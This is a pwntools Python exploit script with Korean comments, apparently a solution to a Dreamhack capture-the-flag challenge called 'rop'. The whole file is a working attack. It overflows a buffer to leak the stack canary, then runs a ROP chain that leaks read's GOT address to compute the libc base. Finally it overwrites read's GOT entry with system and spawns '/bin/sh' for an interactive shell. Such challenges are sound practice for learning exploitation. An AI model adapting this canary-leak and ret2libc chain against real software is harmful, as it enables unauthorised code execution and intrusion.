from pwn import *

#context.log_level = "debug"
context.arch = "amd64"

def start():
    if args.REMOTE:
        host = "host8.dreamhack.games"
        port = 17575
        return remote(host,port)
    else:
        return process("./rop")
p = start()

e = ELF('./rop')    #elf 파일 파싱
libc = ELF('./libc.so.6')
#plt=함수호출용 got=실제 libc함수 주소가 저장된 테이블
read_plt = e.plt['read']    #read함수 got참조해서 호출
read_got = e.got['read']    #read함수 주소
write_plt = e.plt['write']  
write_got = e.got['write']  #write함수 주소

pop_rdi = 0x400853
pop_rsi = 0x400851
ret = 0x400596

payload = b'a'*0x39
p.sendafter(b"Buf: ",payload)

p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))

# payload
payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8

# write(1, read_got, ...)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)   #reat_got 주소 출력 

# read(0, read_got, ...)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# read("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

# pause()

p.sendafter('Buf: ', payload)

# libc base
read_addr = u64(p.recvn(8))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')

# system
system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
